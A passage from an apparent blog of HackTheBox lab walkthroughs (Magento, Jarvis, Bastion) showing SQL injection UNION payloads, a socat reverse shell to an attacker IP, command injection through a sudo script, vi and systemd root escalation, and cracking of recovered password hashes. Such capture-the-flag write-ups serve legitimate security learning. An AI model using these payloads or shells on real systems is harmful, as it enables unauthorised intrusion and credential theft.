10s=====================================================2019/08/13 13:32:28 Starting gobuster=====================================================http://10.10.10.140/.htaccess (Status: 403)http://10.10.10.140/.htpasswd (Status: 403)http://10.10.10.140/app (Status: 301)http://10.10.10.140/downloader (Status: 301)http://10.10.10.140/errors (Status: 301)http://10.10.10.140/favicon.ico (Status: 200)http://10.10.10.140/includes (Status: 301)http://10.10.10.140/js (Status: 301)http://10.10.10.140/lib (Status: 301)http://10.10.10.140/media (Status: 301)http://10.10.10.140/pkginfo (Status: 301)http://10.10.10.140/server-status (Status: 403)http://10.10.10.140/shell (Status: 301)http://10.10.10.140/skin (Status: 301)http://10.10.10.140/var (Status: 301)=====================================================2019/08/13 13:33:45 Finished=====================================================Going through each of the directories and searching for anything out of the ordinary didn’t return very much results. However, the ‘downloader’ page gives details on the version of Magento:We have Magento Connect Manager ver. 1.9.0.0, which the base version should match.ExploitationResearchWith the information found so far, we can look for public exploits or vulnerabilities to use.There are a few that are applicable to this version, and after researching them for a little bit, it is obvious the one we need is related to the ShopLift vuln. During research on the ShopLift vuln, I found another public exploit that has slight differences, and it could be useful to have both.The Blackhat WayAfter seeing there’s a preprogrammed password in the exploit, and it’s a very easily found one, I thought there might be some other hackers on the free server I’m using that would simply leave the default creds in. So I put them into the ‘/downloader’ page, and voila!There’s a “Return to Admin” button that will then take us to the normal admin dashboard. Or…The Not-Quite-As-Blackhat WayIf taking advantage of other hackers on the server isn’t your way, or if you’re alone on a paid server, it’s almost just as easy to exploit it yourself.Thing is, the exploit code as it comes doesn’t work, even after changing the target to our host address.So, good thing we found a second exploit version.The critical difference is the addition of /index.php/ to the target URL, as shown in the screenshot.After adding that change to the exploit code (don’t forget to modify the default credentials) it works!Shell HuntingThis is where I spent the most time looking around and poking at things, searching for command injection. Eventually, I stopped wasting time and started Googling and searching the forum.I was able to find one CVE for code execution on this version. However, on the forum, several people mentioned abusing extensions to get to a shell. So that’s the direction I took instead of the CVE.First I tried to manipulate the extension creation process to get some code exec result, but I eventually gave up that route and figured there’s probably already some extension to load that would help. Thanks to other hackers on the free server, it was relatively easy to figure out what extension that could be. On the Magento Downloader page, there is a section that lists which extensions are loaded:And at the bottom of the list, there is an extension allowing access to the filesystem! That can’t be there normally…Since it’s already loaded in this instance, I shouldn’t need to load it again, just learn how to use it. However, that is definitely not always the case. This box spends a lot of time being unavailable on the free server and has to get reset often, and when it does somebody will need to upload the Magpleasure extension. Turns out there’s a checkbox on the Magento Downloader that causes it to be unavailable if left checked during extension uploads… uncheck that when uploading.How to use the extension:Once in the filesystem, I tried to create a file, but there was no clear way to do so with MagPleasure.Another thing to do is to modify files already on the system, and there are several targets to choose from. From having to restart so many times dues to service unavailable issues, I’ve noticed other hackers tend to prefer the ‘get.php’ file. To not get clobbered, I used the ‘install.php’ file for my reverse shell.EscalationFor the first shell connection, we’re logged in as ‘www-data’. Not too surprising. What is surprising though, is that www-data can access the user home directory! That’s not really a normal scenario, but I’ll take it! Just cat /home/haris/user.txt for the flag.Now to find a privilege escalation to the user account.I was going to find a way to upload LinEnum and do proper enumeration, but I remember reading on several forum posts that there’s a very basic permissions issue to use for root privileges escalation. One of the very first things to look for is sudo permissions, so that’s what I did:Look at that! We can use vi as root, and then a simple shell escape from inside vi:First, I used the command sudo vi ./test.txt … but it errors with “sudo: no tty present and no askpass program specified”After trying a few things I landed on the fact that I didn’t type it in exactly as it is in sudo -l … so I tried again with: sudo /usr/bin/vi /var/www/html/test.txt and that let me in as root.To use a shell escape in vi, we can type :!/bin/sh for the win 🙂" }, { "title": "HackTheBox: Jarvis", "url": "/posts/hackthebox-jarvis/", "categories": "Walkthrough, HackTheBox", "tags": "Linux, sqli, mysql, phpmyadmin, lfi, socat, systemctl", "date": "2019-08-19 10:04:56 -0400", "snippet": "Recon:The website isn’t bare, but most of the links found don’t actually go anywhere. The only page with anything really going on is ‘Rooms’, where you’ll find the links to the rooms are PHP requests.Port ScanAfter a thorough port-scan with Nmap you’ll notice there are the usual ports open:PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)| 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)|_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Stark HotelAnd also a high port that’s serving a webpage:64999/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Site doesn&#39;t have a title (text/html).Web Directory ScanPerforming a directory scan on the regular port 80 shows several folders, and PHPMyAdmin, which is interesting.root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u supersecurehotel.htb=====================================================Gobuster v2.0.0 OJ Reeves (@TheColonial)=====================================================[+] Mode : dir[+] Url/Domain : http://supersecurehotel.htb/[+] Threads : 10[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout : 10s=====================================================2019/07/24 12:16:13 Starting gobuster=====================================================/images (Status: 301)/css (Status: 301)/js (Status: 301)/fonts (Status: 301)/phpmyadmin (Status: 301)/sass (Status: 301)/server-status (Status: 403)=====================================================2019/07/24 12:30:34 Finished=====================================================Web HackingInvestigating PHPMyAdminI tried logging into the PHPMyAdmin with some low-hanging fruit credentials, but no luck there. However, it did give an error message that told my the database being used is MySQL.Investigating room.phpLooking into the source code from the site, I found only one lookup that was functional, and that’s the room.php lookup. The query could be going to a SQL statement to generate the room details.Trying a few common things with the input was fruitless. Then I tried to start smaller and see if it’ll accept an apostrophe. It doesn’t. Instead, it returns a broken page like so:Then I tried to encode the apostrophe as URL hex code %27 and that didn’t work either. But then I tried a double URL encoding of %2527 and bingo! There was a normal page view.http://10.10.10.143/room.php?cod=3%2527SQL InjectionWith knowing there’s a SQL injection on the page, I went into trying some common things to leverage the vulnerability.room.php?cod=1%2527 or 1=1That returns the first record in the table, which is the first room “1”. So either there’s a LIMIT operator, or the PHP code only selects the first result to put into the page.Also, some experimentation shows that only the first quote character needs to be double encoded, and other important characters tested are not even filtered!room.php?cod=1%2527 and (&#39;_&#39;=&#39;_&#39;)… this actually returns a functional result.At first, I was doing many many queries using EXIST to figure out the shape of the database, but then I found an article online that showed me a much mo better process with SQLi. I’ve since lost track of the article, sorry.Step 1 – Figure out the shape of the table we’re working with. First get the number of columns in the current table, for use with UNION statements later.I began using an ORDER BY statement and a ‘1’ for the column count.room.php?cod=1%2527 order by 1Then, increment the column count until it returns an invalid response.room.php?cod=1%2527 order by 8Since ‘8’ is where it breaks, that means 7 columns are good, and that’s what we need for UNIONs.Sending a UNION statement with all columns numbered will show where each piece of information goes in the result. One thing, it needs a blank page to start with, so I gave it an invalid room number.room.php?cod=99%2527 union select 1,2,3,4,5,6,7Step 2 – Request some basic information about the database and it’s structure.room.php?cod=99%2527 union select 1,@@datadir,@@basedir,database(),user(),6,7 Step 3 – After getting the database name ‘hotel’, I extracted the table and column information.The below statement retrieves the table name.room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like &#39;hotel&#39;After that, use a statement like below to extract the columns. Increment the LIMIT operator to get the data out one at a time.room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like &#39;room&#39; limit 0,1 room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like &#39;room&#39; limit 1,1After going through all of the columns until the page breaks, I ended up with the following: Room 1- cod2- name3- price4- descrip5- star6- image7- miniThis is all good info, but it didn’t get me what I wanted, which was the ‘user’ info. The query for extracting the tables doesn’t show us any more tables besides ‘hotel’. I knew there had to be more, so I tried another table extraction.room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like &#39;user&#39; limit 0, 1Now that was getting me other tables, and ones with ‘user’ fields! Incrementing the LIMIT operator resulted in quite a lot of tables. Tables PROCESSLISTUSER_STATISTICScolumns_privdbprocs_privproxies_privroles_mappingtables_privuseraccountsevents_stages_summary_by_account_by_event_nameevents_stages_summary_by_user_by_event_nameevents_statements_summary_by_account_by_event_nameevents_statements_summary_by_user_by_event_nameevents_waits_summary_by_account_by_event_nameevents_waits_summary_by_user_by_event_namesetup_actorsusersTwo tables stood out, ‘user’ and ‘users’. It was time to do a little more investigating by getting the columns of each of these tables using similar statements as before. The resulting table structures are: user HostUserPasswordSelect_privInsert_privUpdate_privDelete_privCreate_privDrop_privReload_privShutdown_privProcess_privFile_privGrant_privReferences_privIndex_privAlter_privShow_db_privSuper_privCreate_tmp_table_privLock_tables_privExecute_privRepl_slave_privRepl_client_privCreate_view_privShow_view_privCreate_routine_privAlter_routine_privCreate_user_privEvent_privTrigger_privCreate_tablespace_privssl_typessl_cipherx509_issuerx509_subjectmax_questionsmax_updatesmax_connectionsmax_user_connectionspluginauthentication_stringpassword_expiredis_roledefault_rolemax_statement_time users USERCURRENT_CONNECTIONSTOTAL_CONNECTIONSThe only one with a ‘password’ column is the table ‘user’. I already knew that the table is not in the ‘hotel’ database, so I needed to figure out which one has it. room.php?cod=99%2527 UNION SELECT ALL 1,table_schema,3,4,table_name,6,7 FROM information_schema.columns where table_name like &#39;user&#39; limit 0,1 It is ‘MySQL’. With that needed bit of info, a statement could be made to extract the credentials.Step 4 – Extract the desired fields.room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1Password CrackingTo crack the password, I used John the Ripper. But John needs to know what type of hash it is, so I used a program ‘hash-identifier’ to help with that.It shows a MySQL5 – SHA1 hash.Putting this into John looks like this:john &amp;amp;#8211;wordlist=/usr/share/wordlists/rockyou.txt &amp;amp;#8211;format:MySQL-sha1 hashes.txtThe password is ‘imissyou’ PHPMYADMINWith credentials found, it was time to go back into the PHPMyAdmin page and see if they work.Guess what… it did!This screenshot shows where to find the version info for PHPMyAdmin once it’s logged in.Knowing the version, you can do a google search and find out there’s a documented local file include issue.Server Side HackingExploitationLook in Metasploit and you’ll see an exploit module for the LFI vulnerability.Once I had a meterpreter shell up, I uploaded “LinEnum.sh”.LinEnum is a script to get a lot of enumerated info about the system at once. When it’s run against this host, there’s one particular bit of information that looks really interesting.It’s useful later for a privilege escalation once we get into the user account ‘pepper’.The most probable way of getting a priv escalation to the user ‘pepper’ is through a script that can be run with sudo:User Escalation/var/www/Admin-Utilities/simpler.pyThe script can be run as sudo by ‘www-data’!Wasn’t sure what to do with it, so I used ‘cat’ on it and copied the output to Notepad++ for studying.I found one probable attack point in the code:Looks like command substitution can be exploited here since the shell execution characters “$()” aren’t filtered!I tried to get a shell to work through simpler.py and failed, many times. So to at least get somewhere, I extracted the user.txt with these commands:sudo -u pepper ./simpler.py -p  To get into the script, then $(cat /home/pepper/user.txt &amp;gt;test.txt) inside of the script.To exploit systemctl for the root flag, I had to get a shell working through the simpler.py script.After trying MANY things, I finally got it to work with a SOCAT shell using the following steps.1) Set up SOCAT on my kali box with:socat file:tty,raw,echo=0 TCP-listen:55552) After dropping into a shell from meterpreter:sudo -u pepper /var/www/Admin-Utilities/simpler.py -p3) From within simpler.py:$(bash)This allowed me to bypass the filtered characters since I need some of them. This bash shell will only allow a single command due to limitations in the injection vuln.Then set up a socat connection with socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555Root EscalationTried to use the ‘systemctl’ command for the next escalation. My first plan was to see if a shell breakout from ‘less’ through ‘systemctl status’ would give me root permissions.But I got an error that the shell isn’t good enough:… and when I broke out of ‘less’, it didn’t give root permissions as I had hoped.I did some research on what ‘systemctl’ is used for and figured I could create my own service, which does certainly run as root and use it to spawn a shell to use.Here’s a very simple service setup that I used:And my script that is referenced in the service:Afterward, I realized it would have been more efficient to put the script command directly in the service setup, but whatever, it works this way too.I first tried making it in the /tmp directory, but when using ‘systemctl’ on it I’d get an error about the file not found!Eventually, I realized it’s because the tmp folder has the sticky bit set where only I can see the files I make in there, so the systemctl was operating under another UID, and couldn’t find it.Then I moved the files to pepper’s home directory and it worked beautifully!See the following screenshot for the command to get the service to work:And proof on my box:" }, { "title": "HackTheBox: Bastion", "url": "/posts/hackthebox-bastion/", "categories": "Walkthrough, HackTheBox", "tags": "smb, vhd, mRemoteNG, Windows", "date": "2019-08-05 16:16:05 -0400", "snippet": "ReconPort scanJumping into this box with a basic NMAP scan shows us a couple of interesting things. First, the SSH server, but that’s pretty normal for HTB boxes. I tried to log into it with anonymous credentials, but that didn’t work out. The most important thing to pick up on from the scan is that it’s likely a Windows machine with NetBIOS and SMB shares, due to the ports 135,139, and 445. Port 135 had several well-known vulnerabilities plague it over the years, so maybe it could be vulnerable to one on this box. Also, there have been vulnerabilities for SMB, like the famous EternalBlue. So we could run some exploit tests against those ports just in case… Initial FootholdExploit ChecksI didn’t find anything useful for RPC exploits, but did find some for the EternalBlue SMB exploit.Then I made another search, this time on “ms17-010”, the vulnerability CVE code.Then I ran the exploit …But no dice… the exploit path is probably a bust, so I moved on from wasting any more time on that approach. SMB Guest AccessThen I tried the easy thing that should have been done first: connect to SMB without credentials.I tried first connecting with the file explorer in kali, but it wouldn’t accept a connection without credentials. So I tried smbmap next.That also didn’t work, but maybe I was just using it wrong. Either way, I moved on to trying smbclient.Finally I was getting somewhere, I could see the shares listed on the SMB service!So then I used smbclient to log in and went exploring…After looking at all the folders, the only interesting one is WindowsImageBackup. Also there is a warning about downloading the entire backup file:After digging into the “Backups” share, I found a WindowsImageBackup with two VHD files.I don’t often listen to signs well, so I proceeded to download the VHDs anyway, but it disconnected the session pretty quickly. Search For UserGetting Into the VHDReading just a little in the forums led to a hint from L4mpje that the VHD files can be opened remotely.Initial googling led to opening VHD files with native windows disk management, but that wound require making a windows VM, or opening my host machine to a network full of hackers, so I decided to keep searching…Eventually found an article explaining how to open VHD files remotely from linux, perfectly fitting the task at handhttps://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25mount -t cifs //10.10.10.134/Backups /mnt/remote -o roThat is the command explained in the article above, and it allowed me to mount the remote SMB share to a local folder…… where I could see and access the VHD files directly! Awesome way to do things and I’ll definitely be keeping notes on this method.Another cool technique is to seperately mount the VHD files to another folder and explore inside, using the local shell!I first opened the smaller VHD, but it turned out to be a system boot partition, so then I opened the larger one to find the next clue. Extracting the Secret SauceFrom here I just explored for a looooong time, looking and prodding at everything.Eventually looked into opening the Registry and extracting passwords.Tried mimikatz, but it didn’t run in kali well.Tried a tool to open the registry like a filesystem and poke around, that didn’t work.Eventually found pwdump from the creddump package that works the best:I knew there were some programs for cracking these hashes with dictionary files, hashcat being one I’ve used before and also John the Ripper.From reading some of the forums to get hints previously, I noticed people talking about “John”, so I guessed JtR would be the way to go. I wasn’t sure what type of hash to put in, and instead of letting john go through them all I looked up the possibilities and tried some until I got it right.To get the available formats for John, use:john -list=formatsThis is the result of the password cracking:Awesome, a user password for L4mpje!!!  bureaulampjeUsing the credentials found in the Registry, I logged into the SSH and the flag is in the Desktop folder. The Search for RootFirst CluesWith the user flag found and a live login to the box, I searched around the files and folders for an hour or more. Just poking and prodding.When reading the forum for clues, several people said to look for a program that seems out of place:Nothing really out of place there, how about the x86 program files:Bingo! mRemoteNG looks pretty out of place! I’ve used this software before, so I know that it stores connections to things, which necessarily includes the passwords. Maybe there’s some passwords we can retrieve.mRemoteNGThis is the directory listing for mRemoteNG:l4mpje@BASTION C:\\Program Files (x86)\\mRemoteNG&amp;gt;dir Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Program Files (x86)\\mRemoteNG 22-02-2019 15:01 &amp;lt;DIR&amp;gt; . 22-02-2019 15:01 &amp;lt;DIR&amp;gt; .. 18-10-2018 23:31 36.208 ADTree.dll 18-10-2018 23:31 346.992 AxInterop.MSTSCLib.dll 18-10-2018 23:31 83.824 AxInterop.WFICALib.dll 18-10-2018 23:31 2.243.440 BouncyCastle.Crypto.dll 18-10-2018 23:30 71.022 Changelog.txt 18-10-2018 23:30 3.224 Credits.txt 22-02-2019 15:01 &amp;lt;DIR&amp;gt; cs-CZ 22-02-2019 15:01 &amp;lt;DIR&amp;gt; de 22-02-2019 15:01 &amp;lt;DIR&amp;gt; el 22-02-2019 15:01 &amp;lt;DIR&amp;gt; en-US 22-02-2019 15:01 &amp;lt;DIR&amp;gt; es 22-02-2019 15:01 &amp;lt;DIR&amp;gt; es-AR 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Firefox 22-02-2019 15:01 &amp;lt;DIR&amp;gt; fr 18-10-2018 23:31 1.966.960 Geckofx-Core.dll 05-07-2017 01:31 4.482.560 Geckofx-Core.pdb 18-10-2018 23:31 143.728 Geckofx-Winforms.dll 05-07-2017 01:31 259.584 Geckofx-Winforms.pdb 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Help 22-02-2019 15:01 &amp;lt;DIR&amp;gt; hu 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Icons 18-10-2018 23:31 607.088 Interop.MSTSCLib.dll 18-10-2018 23:31 131.440 Interop.WFICALib.dll 22-02-2019 15:01 &amp;lt;DIR&amp;gt; it 22-02-2019 15:01 &amp;lt;DIR&amp;gt; ja-JP 22-02-2019 15:01 &amp;lt;DIR&amp;gt; ko-KR 07-10-2018 13:21 18.326 License.txt 18-10-2018 23:31 283.504 log4net.dll 18-10-2018 23:31 412.528 MagicLibrary.dll 18-10-2018 23:31 1.552.240 mRemoteNG.exe 07-10-2018 13:21 28.317 mRemoteNG.exe.config 18-10-2018 23:30 2.405.888 mRemoteNG.pdb 22-02-2019 15:01 &amp;lt;DIR&amp;gt; nb-NO 22-02-2019 15:01 &amp;lt;DIR&amp;gt; nl 18-10-2018 23:31 451.952 ObjectListView.dll 22-02-2019 15:01 &amp;lt;DIR&amp;gt; pl 22-02-2019 15:01 &amp;lt;DIR&amp;gt; pt 22-02-2019 15:01 &amp;lt;DIR&amp;gt; pt-BR 07-10-2018 13:21 707.952 PuTTYNG.exe 07-10-2018 13:21 887 Readme.txt 18-10-2018 23:31 415.088 Renci.SshNet.dll 22-02-2019 15:01 &amp;lt;DIR&amp;gt; ru 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Schemas 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Themes 22-02-2019 15:01 &amp;lt;DIR&amp;gt; tr-TR 22-02-2019 15:01 &amp;lt;DIR&amp;gt; uk 18-10-2018 23:31 152.432 VncSharp.dll 18-10-2018 23:31 312.176 WeifenLuo.WinFormsUI.Docking.dll 18-10-2018 23:31 55.152 WeifenLuo.WinFormsUI.Docking.ThemeVS2003.dll18-10-2018 23:31 168.816 WeifenLuo.WinFormsUI.Docking.ThemeVS2012.dll18-10-2018 23:31 217.968 WeifenLuo.WinFormsUI.Docking.ThemeVS2013.dll18-10-2018 23:31 243.056 WeifenLuo.WinFormsUI.Docking.ThemeVS2015.dll22-02-2019 15:01 &amp;lt;DIR&amp;gt; zh-CN 22-02-2019 15:01 &amp;lt;DIR&amp;gt; zh-TW 28 File(s) 17.802.352 bytes 28 Dir(s) 11.376.021.504 bytes free After looking at the mRemoteNG.exe.config, there wasn’t anyting obviously useful to me. So I looked in the program data folders.l4mpje@BASTION C:\\Program Files (x86)\\mRemoteNG&amp;gt;dir C:\\ProgramData Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\ProgramData 16-07-2016 15:23 &amp;lt;DIR&amp;gt; Comms 22-02-2019 13:36 &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 16-07-2016 15:23 &amp;lt;DIR&amp;gt; SoftwareDistribution 25-04-2019 06:08 &amp;lt;DIR&amp;gt; ssh 12-09-2016 13:37 &amp;lt;DIR&amp;gt; USOPrivate 12-09-2016 13:37 &amp;lt;DIR&amp;gt; USOShared 16-04-2019 12:18 &amp;lt;DIR&amp;gt; VMware 0 File(s) 0 bytes 7 Dir(s) 11.374.854.144 bytes freeNope, nothing there either.And in AppData\\Local\\mRemoteNG there is only one file, user.configl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Local\\mRemoteNG\\mRemoteNG.exe_Url_pjpxdehxpaaorqg2thmuhl11a34i3ave\\1.76.11.40527&amp;gt;type user.config &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;userSettings&amp;gt; &amp;lt;mRemoteNG.Settings&amp;gt; &amp;lt;setting name=&quot;MainFormLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;-8, -8&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MainFormSize&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;1040, 744&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MainFormState&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;Maximized&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MainFormKiosk&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;DoUpgrade&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;LoadConsFromCustomLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;FirstStart&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ResetPanels&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;NoReconnect&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ExtAppsTBVisible&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ExtAppsTBShowText&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;True&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ExtAppsTBLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;3, 25&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ExtAppsTBParentDock&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;Bottom&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;QuickyTBVisible&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;True&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;QuickyTBLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;3, 24&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;QuickyTBParentDock&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;Top&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ResetToolbars&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;CheckForUpdatesAsked&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;True&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;CheckForUpdatesLastCheck&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;02/22/2019 13:01:46&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;UpdatePending&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;ThemeName&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;vs2015light&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;PuttySavedSessionsPanel&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;General&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;EncryptionEngine&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;AES&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;EncryptionBlockCipherMode&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;GCM&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;LogFilePath&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\mRemoteNG.log&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MultiSshToolbarLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;3, 0&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MultiSshToolbarParentDock&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;Top&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MultiSshToolbarVisible&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;False&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MainFormRestoreSize&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;1040, 610&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;setting name=&quot;MainFormRestoreLocation&quot; serializeAs=&quot;String&quot;&amp;gt; &amp;lt;value&amp;gt;0, 156&amp;lt;/value&amp;gt; &amp;lt;/setting&amp;gt; &amp;lt;/mRemoteNG.Settings&amp;gt; &amp;lt;/userSettings&amp;gt; &amp;lt;/configuration&amp;gt; That gave me the path of the log file, but nothing was really interesting in the log file itself. However, other things were in the AppData folder:l4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&amp;gt;dir Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG 22-02-2019 15:03 &amp;lt;DIR&amp;gt; . 22-02-2019 15:03 &amp;lt;DIR&amp;gt; .. 22-02-2019 15:03 6.316 confCons.xml 22-02-2019 15:02 6.194 confCons.xml.20190222-1402277353.backup 22-02-2019 15:02 6.206 confCons.xml.20190222-1402339071.backup 22-02-2019 15:02 6.218 confCons.xml.20190222-1402379227.backup 22-02-2019 15:02 6.231 confCons.xml.20190222-1403070644.backup 22-02-2019 15:03 6.319 confCons.xml.20190222-1403100488.backup 22-02-2019 15:03 6.318 confCons.xml.20190222-1403220026.backup 22-02-2019 15:03 6.315 confCons.xml.20190222-1403261268.backup 22-02-2019 15:03 6.316 confCons.xml.20190222-1403272831.backup 22-02-2019 15:03 6.315 confCons.xml.20190222-1403433299.backup 22-02-2019 15:03 6.316 confCons.xml.20190222-1403486580.backup 22-02-2019 15:03 51 extApps.xml 22-02-2019 15:03 5.217 mRemoteNG.log 22-02-2019 15:03 2.245 pnlLayout.xml 22-02-2019 15:01 &amp;lt;DIR&amp;gt; Themes 14 File(s) 76.577 bytes 3 Dir(s) 11.441.676.288 bytes freeconfCons.xml looked particularly interesting. It was clearly important since it had all those backups.l4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&amp;gt;type confCons.xml &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt; &amp;lt;mrng:Connections xmlns:mrng=&quot;http://mremoteng.org&quot; Name=&quot;Connections&quot; Export=&quot;false&quot; EncryptionEngine=&quot;AES&quot; BlockCipherMode=&quot;GCM&quot; KdfIterations=&quot;1000&quot; FullFileEncryption=&quot;false&quot; Protected=&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot; ConfVersion=&quot;2.6&quot;&amp;gt; &amp;lt;Node Name=&quot;DC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot; Username=&quot;Administrator&quot; Domain=&quot;&quot; 